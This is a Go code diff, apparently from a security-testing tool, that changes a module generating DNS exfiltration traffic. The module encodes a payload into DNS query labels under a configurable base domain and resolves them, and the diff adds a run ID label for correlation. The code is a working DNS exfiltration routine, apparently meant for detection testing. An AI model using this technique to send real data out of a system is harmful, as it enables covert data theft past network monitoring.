@@ -77,15 +77,20 @@ func chunkExfilLabels(encoded string, max int) []string {
 }
 
 // exfilQueries builds the DNS names for exfiltration. Each name is
-// <chunk>.<seq>.<baseDomain>, with the chunk label capped at dnsLabelMax
-// and the total name at dnsNameMax. Chunks that would exceed the name
-// limit are dropped.
-func exfilQueries(payload, baseDomain string) []string {
+// <chunk>.<seq>.<baseDomain>, or <chunk>.<seq>.<runID>.<baseDomain> when a
+// run ID is set, so a consumer can correlate the queries back to the run
+// (the run ID is a cleartext label, not part of the base32 payload). The
+// chunk label is capped at dnsLabelMax and the total name at dnsNameMax;
+// chunks that would exceed the name limit are dropped.
+func exfilQueries(payload, baseDomain, runID string) []string {
 	encoded := encodeExfilPayload(payload)
 	chunks := chunkExfilLabels(encoded, dnsLabelMax)
 	queries := make([]string, 0, len(chunks))
 	for i, chunk := range chunks {
-		name := fmt.Sprintf("%s.%s.%s", chunk, fmt.Sprintf("%d", i), baseDomain)
+		name := fmt.Sprintf("%s.%d.%s", chunk, i, baseDomain)
+		if runID != "" {
+			name = fmt.Sprintf("%s.%d.%s.%s", chunk, i, runID, baseDomain)
+		}
 		if len(name) <= dnsNameMax {
 			queries = append(queries, name)
 		}
@@ -98,7 +103,7 @@ func (n *netDNSExfil) Generate(ctx context.Context, params module.Params, emit m
 	baseDomain := params.Get("base_domain", defaultExfilDomain)
 	info := n.Info()
 
-	queries := exfilQueries(payload, baseDomain)
+	queries := exfilQueries(payload, baseDomain, module.RunIDFromContext(ctx))
 	resolver := net.DefaultResolver
 	for i, qname := range queries {
 		select {
@@ -138,7 +143,7 @@ func (n *netDNSExfil) Generate(ctx context.Context, params module.Params, emit m
 func (n *netDNSExfil) DryRun(params module.Params) []string {
 	payload := params.Get("payload", "macnoise-exfil-test")
 	baseDomain := params.Get("base_domain", defaultExfilDomain)
-	queries := exfilQueries(payload, baseDomain)
+	queries := exfilQueries(payload, baseDomain, "")
 	steps := make([]string, len(queries))
 	for i, q := range queries {
 		steps[i] = fmt.Sprintf("DNS resolve: %s", q)
